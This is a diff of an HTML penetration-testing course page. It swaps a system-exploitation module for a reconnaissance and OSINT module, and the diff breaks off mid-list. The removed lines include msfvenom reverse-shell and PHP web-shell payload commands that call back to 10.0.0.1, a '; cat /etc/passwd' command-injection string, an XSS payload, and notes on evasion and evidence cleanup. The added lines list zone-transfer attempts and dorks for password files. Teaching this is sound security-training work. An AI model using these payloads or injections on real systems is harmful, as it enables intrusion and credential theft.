@@ -1,338 +1,331 @@
+
 <div class="max-w-4xl mx-auto p-6 bg-slate-900 text-slate-100">
-  <h1 class="text-3xl font-bold mb-6 text-slate-100">Module 6: System Exploitation Techniques</h1>
+  <h1 class="text-3xl font-bold mb-6 text-slate-100">Module 6: Information Gathering and Reconnaissance</h1>
   
   <p class="text-slate-300 mb-6 text-lg leading-relaxed">
-    System exploitation is the process of leveraging vulnerabilities to gain unauthorized access to target systems. This module covers common exploitation techniques, payload development, and post-exploitation activities.
+    Information gathering and reconnaissance form the foundation of any successful penetration test. This comprehensive module covers passive and active intelligence gathering techniques, OSINT methodologies, and systematic approaches to target analysis.
   </p>
+
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Intelligence Gathering" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Thorough reconnaissance provides the intelligence needed for effective penetration testing</p>
+  </div>
 
   <h2 class="text-2xl font-semibold text-slate-100 mb-4">Learning Objectives</h2>
   <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
     <ul class="text-slate-300 space-y-2">
-      <li>• Master common system exploitation techniques and methodologies</li>
-      <li>• Understand buffer overflow exploitation and memory corruption</li>
-      <li>• Learn privilege escalation techniques for various operating systems</li>
-      <li>• Develop and deploy custom exploits and payloads</li>
-      <li>• Practice post-exploitation activities and persistence mechanisms</li>
-      <li>• Implement evasion techniques to bypass security controls</li>
+      <li>• Master passive information gathering and OSINT techniques</li>
+      <li>• Learn active reconnaissance methods and tools</li>
+      <li>• Understand DNS enumeration and subdomain discovery</li>
+      <li>• Practice social media intelligence and people searching</li>
+      <li>• Implement automated reconnaissance workflows</li>
+      <li>• Analyze and correlate gathered intelligence effectively</li>
     </ul>
   </div>
 
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Exploitation Fundamentals</h3>
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 1: Passive Information Gathering</h3>
+  
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1516321497487-e288fb19713f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="OSINT Research" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Open source intelligence gathering reveals valuable target information</p>
+  </div>
+
   <p class="text-slate-300 mb-4">
-    Understanding the exploitation process helps identify opportunities and develop effective attack strategies.
+    Passive information gathering involves collecting intelligence about the target without directly interacting with their systems. This approach minimizes detection risk while maximizing intelligence value.
   </p>
+
+  <h4 class="text-lg font-semibold text-slate-100 mb-3">OSINT Sources and Techniques</h4>
 
   <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Exploitation Process</h4>
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-blue-400 mb-2">Public Records and Websites</h5>
       <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Vulnerability Identification:</strong> Discover exploitable flaws</li>
-        <li>• <strong>Exploit Development:</strong> Create or modify exploits</li>
-        <li>• <strong>Payload Selection:</strong> Choose appropriate payload</li>
-        <li>• <strong>Exploit Delivery:</strong> Execute the attack</li>
-        <li>• <strong>Post-Exploitation:</strong> Maintain access and gather intelligence</li>
-        <li>• <strong>Evidence Cleanup:</strong> Remove traces of compromise</li>
+        <li>• Corporate websites and documentation</li>
+        <li>• SEC filings and business registrations</li>
+        <li>• Patent and trademark databases</li>
+        <li>• Government contract databases</li>
+        <li>• Press releases and news articles</li>
+        <li>• Academic publications and whitepapers</li>
       </ul>
     </div>
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Exploit Types</h4>
+    
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-green-400 mb-2">Technical Resources</h5>
       <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Remote Exploits:</strong> Network-based attacks</li>
-        <li>• <strong>Local Exploits:</strong> Privilege escalation</li>
-        <li>• <strong>Client-Side Exploits:</strong> Browser and application attacks</li>
-        <li>• <strong>Web Application Exploits:</strong> SQL injection, XSS</li>
-        <li>• <strong>Binary Exploits:</strong> Buffer overflows, format strings</li>
-        <li>• <strong>Social Engineering:</strong> Human-based attacks</li>
+        <li>• WHOIS database information</li>
+        <li>• DNS records and historical data</li>
+        <li>• SSL certificate transparency logs</li>
+        <li>• Shodan and Censys search engines</li>
+        <li>• Archive.org wayback machine</li>
+        <li>• Code repositories (GitHub, GitLab)</li>
       </ul>
     </div>
   </div>
 
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Metasploit Framework</h3>
-  <p class="text-slate-300 mb-4">
-    Metasploit is the most widely used exploitation framework, providing a comprehensive platform for developing and deploying exploits.
-  </p>
+  <h4 class="text-lg font-semibold text-slate-100 mb-3">DNS Intelligence Gathering</h4>
 
   <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">Metasploit Components</h4>
+    <h5 class="font-semibold text-cyan-400 mb-3">DNS Enumeration Techniques</h5>
     <div class="space-y-3">
       <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Exploits</h5>
-        <p class="text-slate-300 text-sm">Code that takes advantage of vulnerabilities in target systems</p>
-        <code class="text-green-400 text-sm">use exploit/windows/smb/ms17_010_eternalblue</code>
+        <h6 class="font-semibold text-slate-100 mb-1">Basic DNS Queries</h6>
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">nslookup target.com</span> - Basic DNS lookup</p>
+          <p><span class="text-cyan-400">dig target.com ANY</span> - All DNS records</p>
+          <p><span class="text-cyan-400">dig @8.8.8.8 target.com MX</span> - Mail server records</p>
+          <p><span class="text-cyan-400">dig target.com NS</span> - Name server records</p>
+        </div>
       </div>
+      
       <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Payloads</h5>
-        <p class="text-slate-300 text-sm">Code executed on target system after successful exploitation</p>
-        <code class="text-green-400 text-sm">set payload windows/x64/meterpreter/reverse_tcp</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Auxiliary Modules</h5>
-        <p class="text-slate-300 text-sm">Scanning, fuzzing, and other supporting functions</p>
-        <code class="text-green-400 text-sm">use auxiliary/scanner/smb/smb_version</code>
+        <h6 class="font-semibold text-slate-100 mb-1">Advanced DNS Techniques</h6>
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">dnsrecon -d target.com</span> - Comprehensive DNS enumeration</p>
+          <p><span class="text-cyan-400">fierce -dns target.com</span> - Subdomain brute forcing</p>
+          <p><span class="text-cyan-400">dnsenum target.com</span> - DNS enumeration tool</p>
+          <p><span class="text-cyan-400">host -t axfr target.com</span> - Zone transfer attempt</p>
+        </div>
       </div>
     </div>
   </div>
 
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Buffer Overflow Exploitation</h3>
-  <p class="text-slate-300 mb-4">
-    Buffer overflows represent a fundamental class of memory corruption vulnerabilities that can lead to code execution.
-  </p>
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 2: Subdomain Discovery</h3>
 
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Stack-Based Overflows</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Overwrite return addresses on stack</li>
-        <li>• Control program execution flow</li>
-        <li>• Common in C/C++ applications</li>
-        <li>• Requires precise memory layout knowledge</li>
-        <li>• Defeated by modern protections (ASLR, DEP)</li>
-      </ul>
-    </div>
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Heap-Based Overflows</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Corrupt heap metadata structures</li>
-        <li>• More complex exploitation techniques</li>
-        <li>• Application-specific vulnerabilities</li>
-        <li>• Require detailed heap analysis</li>
-        <li>• Often lead to arbitrary code execution</li>
-      </ul>
-    </div>
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1544197150-b99a580bb7a8?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Subdomain Mapping" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Subdomain discovery reveals hidden attack surfaces and forgotten systems</p>
   </div>
 
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Windows Exploitation</h3>
   <p class="text-slate-300 mb-4">
-    Windows systems present unique exploitation opportunities through service vulnerabilities and configuration weaknesses.
-  </p>
-
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">Common Windows Exploits</h4>
-    <div class="space-y-3">
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">EternalBlue (MS17-010)</h5>
-        <p class="text-slate-300 text-sm mb-1">SMB vulnerability allowing remote code execution</p>
-        <code class="text-green-400 text-sm">exploit/windows/smb/ms17_010_eternalblue</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">BlueKeep (CVE-2019-0708)</h5>
-        <p class="text-slate-300 text-sm mb-1">RDP vulnerability in older Windows versions</p>
-        <code class="text-green-400 text-sm">exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">PrintNightmare (CVE-2021-34527)</h5>
-        <p class="text-slate-300 text-sm mb-1">Print Spooler service vulnerability</p>
-        <code class="text-green-400 text-sm">exploit/windows/local/cve_2021_34527_printnightmare</code>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Linux Exploitation</h3>
-  <p class="text-slate-300 mb-4">
-    Linux exploitation often focuses on service vulnerabilities and privilege escalation through kernel exploits.
-  </p>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Service Exploits</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>SSH Vulnerabilities:</strong> Authentication bypasses</li>
-        <li>• <strong>Web Server Exploits:</strong> Apache, Nginx vulnerabilities</li>
-        <li>• <strong>Database Exploits:</strong> MySQL, PostgreSQL flaws</li>
-        <li>• <strong>FTP Exploits:</strong> vsftpd, ProFTPD vulnerabilities</li>
-        <li>• <strong>Samba Exploits:</strong> SMB service vulnerabilities</li>
-      </ul>
-    </div>
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Kernel Exploits</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Dirty COW:</strong> Race condition privilege escalation</li>
-        <li>• <strong>DirtyCred:</strong> Kernel credential corruption</li>
-        <li>• <strong>CVE-2022-2586:</strong> nft_object UAF vulnerability</li>
-        <li>• <strong>Baron Samedit:</strong> Sudo heap overflow</li>
-        <li>• <strong>PwnKit:</strong> Polkit privilege escalation</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Web Application Exploitation</h3>
-  <p class="text-slate-300 mb-4">
-    Web applications present a large attack surface with various injection and logic vulnerabilities.
-  </p>
-
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">OWASP Top 10 Exploits</h4>
-    <div class="space-y-3">
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">SQL Injection</h5>
-        <p class="text-slate-300 text-sm mb-1">Database query manipulation for data extraction</p>
-        <code class="text-green-400 text-sm">sqlmap -u "http://target.com?id=1" --dbs</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Cross-Site Scripting (XSS)</h5>
-        <p class="text-slate-300 text-sm mb-1">Client-side code injection in web applications</p>
-        <code class="text-green-400 text-sm">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Command Injection</h5>
-        <p class="text-slate-300 text-sm mb-1">Operating system command execution</p>
-        <code class="text-green-400 text-sm">; cat /etc/passwd</code>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Privilege Escalation</h3>
-  <p class="text-slate-300 mb-4">
-    Privilege escalation techniques help gain higher-level access after initial compromise.
-  </p>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Windows Privilege Escalation</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Unquoted Service Paths:</strong> Service hijacking</li>
-        <li>• <strong>Weak Service Permissions:</strong> Service modification</li>
-        <li>• <strong>DLL Hijacking:</strong> Library replacement attacks</li>
-        <li>• <strong>Token Impersonation:</strong> Stolen access tokens</li>
-        <li>• <strong>UAC Bypass:</strong> User Access Control circumvention</li>
-        <li>• <strong>Kernel Exploits:</strong> System-level vulnerabilities</li>
-      </ul>
-    </div>
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Linux Privilege Escalation</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>SUID/SGID Binaries:</strong> Elevated execution</li>
-        <li>• <strong>Sudo Misconfiguration:</strong> Command execution rights</li>
-        <li>• <strong>Cron Job Hijacking:</strong> Scheduled task modification</li>
-        <li>• <strong>PATH Manipulation:</strong> Binary replacement attacks</li>
-        <li>• <strong>Capabilities Abuse:</strong> Linux capability exploitation</li>
-        <li>• <strong>Container Escapes:</strong> Breaking out of containers</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Payload Development</h3>
-  <p class="text-slate-300 mb-4">
-    Custom payloads provide flexibility and can evade detection better than standard payloads.
-  </p>
-
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">Payload Types and Generation</h4>
-    <div class="space-y-3">
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Meterpreter Payloads</h5>
-        <code class="text-green-400 text-sm">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Shellcode Generation</h5>
-        <code class="text-green-400 text-sm">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python</code>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Web Shells</h5>
-        <code class="text-green-400 text-sm">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php</code>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Evasion Techniques</h3>
-  <p class="text-slate-300 mb-4">
-    Evasion techniques help bypassed security controls like antivirus, firewalls, and intrusion detection systems.
-  </p>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Antivirus Evasion</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Payload Encoding:</strong> Obfuscate malicious code</li>
-        <li>• <strong>Crypters/Packers:</strong> Encrypt and compress payloads</li>
-        <li>• <strong>Polymorphic Code:</strong> Change code signature</li>
-        <li>• <strong>Living off the Land:</strong> Use legitimate tools</li>
-        <li>• <strong>Fileless Attacks:</strong> Memory-only execution</li>
-        <li>• <strong>Staged Payloads:</strong> Multi-step deployment</li>
-      </ul>
-    </div>
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Network Evasion</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Protocol Tunneling:</strong> Hide traffic in legitimate protocols</li>
-        <li>• <strong>Domain Fronting:</strong> Mask C2 communications</li>
-        <li>• <strong>Traffic Fragmentation:</strong> Split packets to avoid detection</li>
-        <li>• <strong>Encryption:</strong> Secure command and control channels</li>
-        <li>• <strong>Timing Attacks:</strong> Slow and low techniques</li>
-        <li>• <strong>Proxy Chains:</strong> Route through multiple proxies</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Post-Exploitation Activities</h3>
-  <p class="text-slate-300 mb-4">
-    Post-exploitation activities focus on maintaining access, gathering intelligence, and lateral movement.
-  </p>
-
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">Common Post-Exploitation Tasks</h4>
-    <div class="space-y-3">
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">System Enumeration</h5>
-        <p class="text-slate-300 text-sm">Gather system information, users, and installed software</p>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Credential Harvesting</h5>
-        <p class="text-slate-300 text-sm">Extract passwords, hashes, and authentication tokens</p>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Persistence Mechanisms</h5>
-        <p class="text-slate-300 text-sm">Establish backdoors and maintain long-term access</p>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-slate-100 mb-1">Data Exfiltration</h5>
-        <p class="text-slate-300 text-sm">Identify and extract sensitive information</p>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Practical Exercises</h3>
-  <p class="text-slate-300 mb-4">
-    Hands-on exercises provide experience with exploitation techniques in controlled environments.
+    Subdomain discovery is crucial for identifying the complete attack surface of a target organization. Many security vulnerabilities exist in forgotten or poorly maintained subdomains.
   </p>
 
   <div class="space-y-4 mb-6">
     <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-slate-100 mb-2">Exercise 1: Metasploit Exploitation</h5>
-      <p class="text-slate-300 text-sm mb-2">Practice using Metasploit against vulnerable targets:</p>
+      <h5 class="font-semibold text-yellow-400 mb-2">Passive Subdomain Discovery</h5>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-slate-300">
+        <div>
+          <p class="font-semibold mb-2">Certificate Transparency:</p>
+          <ul class="space-y-1">
+            <li>• crt.sh database queries</li>
+            <li>• Google Certificate Transparency</li>
+            <li>• Facebook Certificate Transparency</li>
+            <li>• Censys certificate search</li>
+          </ul>
+        </div>
+        <div>
+          <p class="font-semibold mb-2">Search Engine Dorking:</p>
+          <ul class="space-y-1">
+            <li>• site:target.com -www</li>
+            <li>• Google, Bing, Yahoo searches</li>
+            <li>• Virus Total domain reports</li>
+            <li>• Passive DNS databases</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-purple-400 mb-2">Active Subdomain Discovery</h5>
+      <div class="font-mono text-sm text-slate-300 space-y-1">
+        <p><span class="text-cyan-400">subfinder -d target.com</span> - Multi-source subdomain discovery</p>
+        <p><span class="text-cyan-400">amass enum -d target.com</span> - Comprehensive enumeration</p>
+        <p><span class="text-cyan-400">sublist3r -d target.com</span> - Python subdomain enumerator</p>
+        <p><span class="text-cyan-400">gobuster dns -d target.com -w wordlist.txt</span> - Brute force discovery</p>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 3: Social Media Intelligence</h3>
+
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Social Media Research" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Social media platforms contain valuable intelligence about organizations and individuals</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Social media intelligence gathering reveals organizational structure, employee information, technology stacks, and potential social engineering vectors.
+  </p>
+
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Employee Intelligence</h4>
       <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Scan for vulnerable services using auxiliary modules</li>
-        <li>• Select appropriate exploits and payloads</li>
-        <li>• Configure exploit options and execute attacks</li>
-        <li>• Perform post-exploitation activities via Meterpreter</li>
+        <li>• LinkedIn company and employee profiles</li>
+        <li>• Job posting technical requirements</li>
+        <li>• Conference presentations and talks</li>
+        <li>• Professional certifications and skills</li>
+        <li>• Personal social media accounts</li>
+        <li>• Email address patterns and formats</li>
+      </ul>
+    </div>
+    
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Technology Stack Intelligence</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Job posting technology requirements</li>
+        <li>• GitHub repository analysis</li>
+        <li>• Technical blog posts and articles</li>
+        <li>• Conference presentation technologies</li>
+        <li>• Vendor relationship announcements</li>
+        <li>• Technology partnership disclosures</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 4: Search Engine Intelligence</h3>
+
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1560472354-b33ff0c44a43?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Search Engine Research" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Advanced search techniques reveal hidden information and sensitive data</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Search engine dorking uses advanced search operators to discover sensitive information, configuration files, and security vulnerabilities exposed through web indexing.
+  </p>
+
+  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">Google Dorking Techniques</h4>
+    <div class="space-y-3">
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-green-400 mb-2">Basic Operators</h5>
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">site:target.com</span> - Search within specific domain</p>
+          <p><span class="text-cyan-400">filetype:pdf site:target.com</span> - Find PDF documents</p>
+          <p><span class="text-cyan-400">intitle:"index of" site:target.com</span> - Directory listings</p>
+          <p><span class="text-cyan-400">inurl:admin site:target.com</span> - Admin interfaces</p>
+        </div>
+      </div>
+      
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-yellow-400 mb-2">Sensitive Information</h5>
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">filetype:sql "INSERT INTO" site:target.com</span> - Database dumps</p>
+          <p><span class="text-cyan-400">filetype:log site:target.com</span> - Log files</p>
+          <p><span class="text-cyan-400">intitle:"config" filetype:txt</span> - Configuration files</p>
+          <p><span class="text-cyan-400">"password" filetype:txt site:target.com</span> - Password files</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 5: Technical Reconnaissance</h3>
+
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Technical Analysis" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Technical reconnaissance reveals infrastructure details and potential vulnerabilities</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Technical reconnaissance focuses on gathering detailed information about the target's technical infrastructure, including servers, services, and security mechanisms.
+  </p>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-red-400 mb-2">Infrastructure Analysis</h5>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-slate-300">
+        <div>
+          <p class="font-semibold mb-2">Network Infrastructure:</p>
+          <ul class="space-y-1">
+            <li>• BGP routing information</li>
+            <li>• AS number identification</li>
+            <li>• IP range ownership</li>
+            <li>• Geographic distribution</li>
+          </ul>
+        </div>
+        <div>
+          <p class="font-semibold mb-2">Technology Stack:</p>
+          <ul class="space-y-1">
+            <li>• Web server identification</li>
+            <li>• Content management systems</li>
+            <li>• JavaScript frameworks</li>
+            <li>• Third-party services</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-blue-400 mb-2">Shodan and Censys Intelligence</h5>
+      <div class="font-mono text-sm text-slate-300 space-y-1">
+        <p><span class="text-cyan-400">shodan search "org:Target Company"</span> - Organization assets</p>
+        <p><span class="text-cyan-400">shodan search "net:192.168.1.0/24"</span> - Network range scan</p>
+        <p><span class="text-cyan-400">censys search "target.com"</span> - Certificate and service data</p>
+        <p><span class="text-cyan-400">shodan search "apache" port:443</span> - Specific service search</p>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 6: Automated Reconnaissance</h3>
+
+  <div class="mb-8">
+    <img src="https://images.unsplash.com/photo-1518709268805-4e9042af2176?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Automation Tools" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Automation tools streamline reconnaissance workflows and improve efficiency</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Automated reconnaissance tools help streamline the information gathering process and ensure comprehensive coverage of potential intelligence sources.
+  </p>
+
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Reconnaissance Frameworks</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• <strong>Recon-ng:</strong> Modular reconnaissance framework</li>
+        <li>• <strong>theHarvester:</strong> Email and subdomain harvesting</li>
+        <li>• <strong>Maltego:</strong> Visual link analysis platform</li>
+        <li>• <strong>SpiderFoot:</strong> Automated OSINT collection</li>
+        <li>• <strong>Photon:</strong> Web crawler for OSINT</li>
+      </ul>
+    </div>
+    
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Custom Automation</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• <strong>Bash Scripts:</strong> Command-line automation</li>
+        <li>• <strong>Python Tools:</strong> Custom reconnaissance scripts</li>
+        <li>• <strong>API Integration:</strong> Third-party service automation</li>
+        <li>• <strong>Workflow Orchestration:</strong> Multi-tool coordination</li>
+        <li>• <strong>Data Correlation:</strong> Intelligence analysis automation</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Practical Exercises</h3>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 1: Comprehensive OSINT</h5>
+      <p class="text-slate-300 text-sm mb-2">Conduct thorough OSINT on a target organization:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Gather corporate and technical information</li>
+        <li>• Map organizational structure and key personnel</li>
+        <li>• Identify technology stack and infrastructure</li>
+        <li>• Document potential social engineering vectors</li>
       </ul>
     </div>
     
     <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-slate-100 mb-2">Exercise 2: Buffer Overflow Development</h5>
-      <p class="text-slate-300 text-sm mb-2">Develop a custom buffer overflow exploit:</p>
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 2: Subdomain Enumeration</h5>
+      <p class="text-slate-300 text-sm mb-2">Perform comprehensive subdomain discovery:</p>
       <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Analyze vulnerable application with debugger</li>
-        <li>• Identify crash point and control EIP register</li>
-        <li>• Find bad characters and suitable return address</li>
-        <li>• Generate shellcode and create working exploit</li>
-      </ul>
-    </div>
-    
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-slate-100 mb-2">Exercise 3: Privilege Escalation</h5>
-      <p class="text-slate-300 text-sm mb-2">Practice privilege escalation techniques:</p>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Enumerate system for escalation opportunities</li>
-        <li>• Exploit SUID binaries and misconfigurations</li>
-        <li>• Use kernel exploits for system-level access</li>
-        <li>• Maintain persistence after privilege escalation</li>
+        <li>• Use multiple passive discovery techniques</li>
+        <li>• Implement brute force enumeration</li>
+        <li>• Validate discovered subdomains</li>
